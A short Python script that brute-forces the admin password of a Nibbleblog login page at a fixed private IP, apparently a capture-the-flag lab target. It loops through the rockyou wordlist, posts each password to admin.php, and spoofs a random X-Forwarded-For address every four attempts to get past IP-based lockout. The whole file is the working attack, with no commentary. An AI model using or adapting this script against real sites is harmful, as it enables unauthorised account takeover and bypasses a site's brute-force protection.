from random import randint
import requests

password_file = '/usr/share/wordlists/rockyou.txt'
rhost = '10.10.10.75'
url = "http://10.10.10.75/nibbleblog/admin.php"

def makeRequest(ip, password):
	headers = {'X-Forwarded-For': ip}
	payload = {'username': 'admin', 'password': password}
	r = requests.post(url, headers=headers, data=payload)
    
	if 'Incorrect username or password.' not in r.text:
		print("[*] Password found!!!: admin-" + password)
		exit(0)

def random_ip():
	return ".".join(str(randint(0, 255)) for _ in range(4))

def run(start_at: int = 1):
	attempt = 0
	attempt_ip = 0
	ip = str(random_ip())
	
	for password in open(password_file):
		if attempt_ip == 4:
			ip = str(random_ip())
			attempt_ip = 0

		password = str(password.strip())
		print("Attempt ["+str(attempt)+"]:\t"+ip+"-"+password)
		makeRequest(ip, password)

		attempt_ip += 1
		attempt += 1

if __name__ == '__main__':
	run()
